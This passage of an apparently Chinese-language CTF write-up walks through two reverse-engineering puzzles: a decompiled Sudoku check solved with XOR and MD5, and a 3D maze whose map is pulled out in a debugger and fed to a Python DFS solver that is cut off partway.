<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">Sudoku</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+Ch] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">9</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = *a1;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">map</span>[<span class="number">9</span> * i + j] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2 != <span class="number">48</span> )</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">map</span>[<span class="number">9</span> * i + j] = v2;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>是个数独的题目，我们提取map里的值，然后去在线解数独的网站进行解密，然后我们分析上述的代码逻辑，根据他的代码逻辑对我们原本的map的值进行修改，就是最后我们要输出的答案</p>
<p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231031125334209.png" alt="image-20231031125334209"></p>
<p>那么我们直接异或就可以了，相同的值异或是0，不同的值异或0也是原本的值</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a=<span class="string">&quot;407003208500020900012980004709104800061000470003270006086300040020740630304002000&quot;</span></span><br><span class="line">b=<span class="string">&quot;497513268538426917612987354759164823261839475843275196986351742125748639374692581&quot;</span></span><br><span class="line">c=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">   c+=<span class="built_in">str</span>(<span class="built_in">int</span>(a[i])^<span class="built_in">int</span>(b[i]))</span><br><span class="line">  <span class="comment">#  print(int(a[i])^int(b[i]),end=&#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># print(c)</span></span><br><span class="line"><span class="comment"># 090510060038406017600007350050060023200839005840005190900051702105008009070690581</span></span><br><span class="line">d=hashlib.md5()</span><br><span class="line">d.update(<span class="string">b&#x27;090510060038406017600007350050060023200839005840005190900051702105008009070690581&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(d.hexdigest())</span><br></pre></td></tr></table></figure>

<h3 id="WEEK2-Run-润！"><a href="#WEEK2-Run-润！" class="headerlink" title="[WEEK2]Run?润！"></a>[WEEK2]Run?润！</h3><p>迷宫题目，学习了一下数据结构中的DFS和BFS算法，提供地图一键解出路径，学习了如何调试出地图</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/T6ML7zwA57JXTRwOZqcxhw?spm=a2c6h.12873639.article-detail.7.19f31041PU5YhX">微信公众平台 (qq.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Sciurdae/article/details/133963882">CTF-Reverse 迷宫地图类题目分析‘‘DFS和BFS算法‘‘（学习笔记）【详】-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Sciurdae/article/details/133964592">SHCTF2023 山河CTF Reverse方向week2全WP【详解】-CSDN博客</a></p>
<p>分析代码，我们看到sub_401A26();就是我们的地图生成函数，我们看到他的调用情况，最一开始调用了一次，然后后续的走迷宫的过程中又生成了一次</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *<span class="title function_">sub_401A26</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  __int64 v1; <span class="comment">// rdx</span></span><br><span class="line">  _DWORD *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">31</span>; j &gt;= <span class="number">0</span>; --j )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = v5++;</span><br><span class="line">      v1 = v0;</span><br><span class="line">      result = dword_408060;</span><br><span class="line">      dword_408060[v1] = (dword_404020[<span class="number">2</span> * dword_408040 + i] &gt;&gt; j) &amp; <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231031181941311.png" alt="image-20231031181941311"></p>
<p>v8 &#x3D; sub_401AAF(v8, Str[i]);是我们的主函数，我们分析其中的代码可以分析出这是3维迷宫,u和q就是控制的三维迷宫的xyz中的x（层），他们使用一次是加减64，同时dword_408040记录的就是我们当初的层数，可以看到调用u和q的时候他会加减变化，初始值为0，w和s是控制的xyz中的y，就是每层的行数，a和d就是控制的z，每一数据具体的列数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_401AAF</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+30h] [rbp+10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">      v3 = a1 - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">      v3 = a1 + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">      v3 = a1 - <span class="number">64</span>;</span><br><span class="line">      <span class="keyword">if</span> ( --dword_408040 &lt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You crossed the line!Get out of here!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_11;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">      v3 = a1 + <span class="number">8</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:</span><br><span class="line">      v3 = a1 + <span class="number">64</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ++dword_408040 &gt; <span class="number">7</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You crossed the line!Get out of here!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_11:</span><br><span class="line">      sub_401A26();</span><br><span class="line">      <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">      v3 = a1 - <span class="number">8</span>;</span><br><span class="line">LABEL_12:</span><br><span class="line">      <span class="keyword">if</span> ( v3 &gt; <span class="number">511</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">      <span class="keyword">if</span> ( dword_408060[v3] )</span><br><span class="line">      &#123;</span><br><span class="line">        dword_408044 = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You crossed the line!Get out of here!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)v3;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">LABEL_16:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You crossed the line!Get out of here!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们分析完了源码接下来就是思考如何获取迷宫，我们采用动调的方式进行取值，我们输入很多u，让他每次判断都是往u的判断里走，因为我们要让dword_408040的值变化，因为生成迷宫的函数中就是根据这个的值进行变化的，然后每次他都会调用一下sub_401A26(),生成对应层的迷宫，调用完了后，我们手动把RIP的值改成0x0000000000401B0F，让他再次进入u这个case判断中，对dword_408040进行自加1，然后继续调用sub_401A26，直到最后dword_408040的值大于7位置，我们到目前也能判断出他是8x8x8的三维迷宫</p>
<p><img src="C:\Users\a\AppData\Roaming\Typora\typora-user-images\image-20231031182756375.png" alt="image-20231031182756375"></p>
<p>调试出了迷宫后我们就可以使用脚本，或者自己读出我们的路径了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">maze = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># maze[x * 64 + y * 8 + z]</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_point_valid</span>(<span class="params"><span class="built_in">map</span>, x, y, z</span>):</span><br><span class="line">    <span class="keyword">if</span> (x &gt;= <span class="number">0</span>) <span class="keyword">and</span> (x &lt;= <span class="number">7</span>) <span class="keyword">and</span> (y &gt;= <span class="number">0</span>) <span class="keyword">and</span> (y &lt;= <span class="number">7</span>) <span class="keyword">and</span> (z &gt;= <span class="number">0</span>) <span class="keyword">and</span> (z &lt;= <span class="number">7</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">map</span>[x * <span class="number">64</span> + y * <span class="number">8</span> + z] != <span class="number">1</span>) <span class="keyword">and</span> ((<span class="built_in">map</span>[x * <span class="number">64</span> + y * <span class="number">8</span> + z] == <span class="number">0</span>) <span class="keyword">or</span> (<span class="built_in">map</span>[x * <span class="number">64</span> + y * <span class="number">8</span> + z] == <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_nex</span>(<span class="params"><span class="built_in">map</span>, x, y, z</span>):</span><br><span class="line">    all_dir = []</span><br><span class="line">    <span class="keyword">if</span> check_point_valid(<span class="built_in">map</span>, x - <span class="number">1</span>, y, z):</span><br><span class="line">        all_dir.append((x - <span class="number">1</span>, y, z, <span class="string">&#x27;q&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> check_point_valid(<span class="built_in">map</span>, x + <span class="number">1</span>, y, z):</span><br><span class="line">        all_dir.append((x + <span class="number">1</span>, y, z, <span class="string">&#x27;u&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> check_point_valid(<span class="built_in">map</span>, x, y - <span class="number">1</span>, z):</span><br><span class="line">        all_dir.append((x, y - <span class="number">1</span>, z, <span class="string">&#x27;w&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> check_point_valid(<span class="built_in">map</span>, x, y + <span class="number">1</span>, z):</span><br><span class="line">        all_dir.append((x, y + <span class="number">1</span>, z, <span class="string">&#x27;s&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> check_point_valid(<span class="built_in">map</span>, x, y, z - <span class="number">1</span>):</span><br><span class="line">        all_dir.append((x, y, z - <span class="number">1</span>, <span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> check_point_valid(<span class="built_in">map</span>, x, y, z + <span class="number">1</span>):</span><br><span class="line">        all_dir.append((x, y, z + <span class="number">1</span>, <span class="string">&#x27;d&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(all_dir)</span><br><span class="line">    <span class="keyword">return</span> all_dir</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_success</span>(<span class="params"><span class="built_in">map</span>, x, y, z</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">map</span>[x * <span class="number">64</span> + y * <span class="number">8</span> + z] == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">mapb, x, y, z, path</span>):</span><br><span class="line">    <span class="built_in">map</span> = mapb.copy()</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">map</span>[x * <span class="number">64</span> + y * <span class="number">8</span> + z] != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">map</span>[x * <span class="number">64</span> + y * <span class="number">8</span> + z] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> check_success(<span class="built_in">map</span>, x, y, z):</span><br><span class="line">        <span class="built_in">print</span>(path)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    